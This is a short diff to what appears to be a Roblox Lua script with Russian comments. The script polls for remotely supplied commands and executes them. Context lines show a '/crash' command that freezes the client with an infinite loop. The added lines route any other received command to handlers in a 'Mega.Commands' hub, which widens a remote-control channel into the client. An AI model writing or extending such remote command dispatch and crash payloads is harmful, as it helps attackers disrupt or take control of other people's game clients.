@@ -61,12 +61,15 @@ task.spawn(function()
                     -- 3. Краш клиента
                     elseif cmd == "/crash" then
                         while true do end 
+                        
+                    -- 4. Остальные команды из твоего модульного хаба
+                    elseif Mega and Mega.Commands and Mega.Commands[cmd] then
+                        task.spawn(Mega.Commands[cmd], data)
                     end
-
                     -- =========================
-                end -- Закрывает проверку decodeSuccess
-            end -- Закрывает проверку success
-        end -- Закрывает цикл while task.wait
-    end -- Закрывает проверку if requestFunc
-end) -- Закрывает task.spawn(function()
+                end -- закрывает if decodeSuccess
+            end -- закрывает if success
+        end -- закрывает while task.wait
+    end -- закрывает if requestFunc
+end)
 -- ========================================================
